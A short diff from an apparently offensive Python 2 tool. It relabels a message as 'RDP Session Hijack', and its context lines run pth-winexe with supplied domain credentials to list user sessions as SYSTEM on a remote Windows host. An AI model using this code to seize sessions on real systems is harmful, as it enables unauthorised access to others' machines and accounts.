@@ -1933,7 +1933,7 @@ if rdp_connect in yesanswers or "ID" in rdp_connect:
 	if "ID" in rdp_connect:
 		if len(targets)==1:
 			try:
-				print colored("[+]RDP Session Jump in:\n",'green')
+				print colored("[+]RDP Session Hijack:\n",'green')
 				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"cmd.exe /C query user \" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 				sessions = proc.communicate()[0]
 				print sessions
